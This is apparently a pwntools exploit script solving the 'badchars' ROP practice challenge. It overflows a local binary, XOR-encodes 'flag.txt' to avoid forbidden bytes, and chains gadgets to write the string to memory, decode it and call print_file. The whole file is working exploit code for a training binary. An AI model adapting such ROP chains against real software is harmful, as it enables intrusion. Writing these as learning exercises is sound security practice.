from pwn import *

pipe = process("./badchars",env={"LD_PRELOAD":"./libbadchars.so"})

flag = "flag.txt"
reflag = b""
badchars = ['x', 'g', 'a', '.']
for i in range(len(flag)):
    if flag[i] in badchars:
        reflag += chr(ord(flag[i]) ^ 1)
    else:
        reflag += flag[i]
# print(reflag)

chain = "E" * 40            # padding to ret address
chain += p64(0x40069c)      # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
chain += reflag             # r12
chain += p64(0x601f00)      # r13  -> target memory
chain += p64(0)             # r14
chain += p64(0)             # r15
chain += p64(0x400634)      # mov qword ptr [r13], r12 ; ret

# --------- xor back ----------
chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 2)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 3)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 4)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a0)      # pop r14 ; pop r15 ; ret
chain += p64(1)             # r14
chain += p64(0x601f00 + 6)  # r15
chain += p64(0x400628)      # xor byte ptr [r15], r14b ; ret

chain += p64(0x4006a3)      # pop rdi ; ret
chain += p64(0x601f00)
chain += p64(0x400510)      # <print_file@plt>

context.log_level = "DEBUG"
print(pipe.recvuntil("> "))
pipe.sendline(chain)
print(pipe.recv())
